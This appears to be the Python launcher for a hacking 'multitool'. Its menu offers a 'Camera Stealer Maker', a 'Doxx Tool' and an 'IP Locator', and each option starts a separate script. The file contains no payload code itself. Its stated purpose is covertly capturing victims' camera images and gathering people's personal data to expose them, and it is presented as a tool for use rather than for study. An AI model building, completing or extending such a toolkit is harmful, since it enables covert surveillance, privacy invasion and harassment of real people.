from colorama import Fore, Style
import os
import time
import subprocess


def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')


banner_text = r"""
,---.    ,---.  ___    _   .---. ,---------. .-./`) ,---------.    ,-----.        ,-----.      .---.      
|    \  /    |.'   |  | |  | ,_| \          \\ .-.')\          \ .'  .-,  '.    .'  .-,  '.    | ,_|      
|  ,  \/  ,  ||   .'  | |,-./  )  `--.  ,---'/ `-' \ `--.  ,---'/ ,-.|  \ _ \  / ,-.|  \ _ \ ,-./  )      
|  |\_   /|  |.'  '_  | |\  '_ '`)   |   \    `-'`"`    |   \  ;  \  '_ /  | :;  \  '_ /  | :\  '_ '`)    
|  _( )_/ |  |'   ( \.-.| > (_)  )   :_ _:    .---.     :_ _:  |  _`,/ \ _/  ||  _`,/ \ _/  | > (_)  )    
| (_ o _) |  |' (`. _` /|(  .  .-'   (_I_)    |   |     (_I_)  : (  '\_/ \   ;: (  '\_/ \   ;(  .  .-'    
|  (_,_)  |  || (_ (_) _) `-'`-'|___(_(=)_)   |   |    (_(=)_)  \ `"/  \  ) /  \ `"/  \  ) /  `-'`-'|___  
|  |      |  | \ /  . \ /  |        \(_I_)    |   |     (_I_)    '. \_/``".'    '. \_/``".'    |        \ 
'--'      '--'  ``-'`-''   `--------`'---'    '---'     '---'      '-----'        '-----'      `--------` 
                                                                                                          
                                                                                                          """


def menu():
    print(Fore.BLUE + banner_text + Style.RESET_ALL)
    print(Fore.MAGENTA + """
    [1] Camera Stealer Maker    [3] IP Locator
    [2] Doxx Tool               [0] Exit\n\n""" + Style.RESET_ALL)


def start():
    time.sleep(1.3)
    clear_console()
    print(Fore.LIGHTBLUE_EX + "Interface was coded by: KOR\nTools coded/found by: potopilo" + Style.RESET_ALL)
    time.sleep(2)
    clear_console()
    menu()


def options():
    choice = input(Fore.YELLOW + "Input here :~: " + Style.RESET_ALL)
    if choice == '1':
        clear_console()
        subprocess.run(["python", "dependencies/cam_capture.py"])
    elif choice == '2':
        clear_console()
        subprocess.run(["python", "dependencies/doxx.py"])
    elif choice == '3':
        clear_console()
        subprocess.run(["python", "dependencies/ip_locator.py"])
    elif choice == '0':
        exit()
    else:
        print(Fore.RED + "Invalid choice" + Style.RESET_ALL)
        clear_console()
        options()


def main():
    start()
    options()


if __name__ == "__main__":
    main()
